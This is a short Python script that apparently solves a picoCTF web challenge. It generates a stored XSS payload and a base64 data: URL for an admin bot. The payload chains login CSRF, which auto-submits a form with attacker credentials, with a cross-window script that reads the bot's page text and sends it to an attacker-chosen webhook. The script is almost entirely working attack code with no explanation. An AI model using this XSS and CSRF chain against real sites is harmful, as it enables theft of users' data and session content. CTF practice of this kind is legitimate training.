from base64 import b64encode

url = 'http://saturn.picoctf.net:53524'
username = 'foo'
password = 'bar'
webhook = input('webhook=')

print('--put in user notes--')
print(f'''<script>
if (window.location.search.includes('pwn')) {{
const w = window.open('', 'attack');
const flag = w.document.body.textContent;
window.location = '{webhook}/?'+flag;
}}
</script>''')

print('--submit url to admin bot--')
payload = f'''<form id="f" action="http://localhost:8080/login" method="POST" target="_blank">
<input type="text" name="username" value="{username}">
<input type="text" name="password" value="{password}">
</form> 
<script>window.open('http://localhost:8080/notes', 'attack'); 
setTimeout(() => document.querySelector('#f').submit(), 1000);
setTimeout(() => {{ window.location = '{url}/notes?pwn'; }}, 2000);</script>'''

print(f'data:text/html;base64,{b64encode(payload.encode()).decode()}')
